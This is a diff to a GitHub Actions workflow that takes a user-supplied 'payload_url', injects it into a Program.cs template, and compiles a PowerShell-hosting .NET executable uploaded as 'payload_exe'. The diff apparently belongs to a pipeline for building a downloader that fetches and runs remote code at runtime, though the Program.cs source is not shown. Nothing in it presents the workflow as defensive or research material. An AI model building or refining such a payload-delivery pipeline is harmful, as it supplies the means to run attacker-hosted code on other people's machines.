@@ -1,10 +1,10 @@
-name: Build PowerShell EXE using .NET
+name: Build PowerShell EXE with Dynamic URL
 
 on:
   workflow_dispatch:
     inputs:
       payload_url:
-        description: 'URL to fetch PowerShell script'
+        description: 'URL to fetch payload'
         required: true
         type: string
 
@@ -16,19 +16,15 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Install .NET SDK
-      run: dotnet --version
-
     - name: Inject Payload URL into Program.cs
-      shell: powershell
       run: |
-        $payloadUrl = '${{ github.event.inputs.payload_url }}'
-        (Get-Content Program.cs) -replace '__PAYLOAD_URL__', $payloadUrl | Set-Content Program.cs
+        $url = '${{ github.event.inputs.payload_url }}'
+        (Get-Content Program.cs) -replace '__PAYLOAD_URL__', $url | Set-Content Program.cs
 
     - name: Create .NET console project
       run: |
         dotnet new console -o PowerShellRunner
-        mv Program.cs PowerShellRunner/
+        cp -Force Program.cs PowerShellRunner/
         cd PowerShellRunner
         dotnet add package Microsoft.PowerShell.SDK
 
@@ -37,10 +33,11 @@ jobs:
         cd PowerShellRunner
         dotnet build -c Release
 
-    - name: Upload executable
+    - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
         name: payload_exe
         path: PowerShellRunner/bin/Release/**/PowerShellRunner.exe
+
 
 
